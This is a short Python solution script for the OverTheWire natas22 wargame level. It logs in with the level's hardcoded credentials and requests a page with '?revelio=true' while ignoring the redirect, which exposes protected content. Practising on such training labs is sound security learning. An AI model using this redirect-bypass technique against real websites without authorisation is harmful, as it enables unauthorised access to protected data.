import requests
import re

username = "natas22"
password = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"

url = "http://natas22.natas.labs.overthewire.org/?revelio=true"

session = requests.Session()
response = session.get(url,auth=(username,password),allow_redirects=False)

content = response.text
print(content)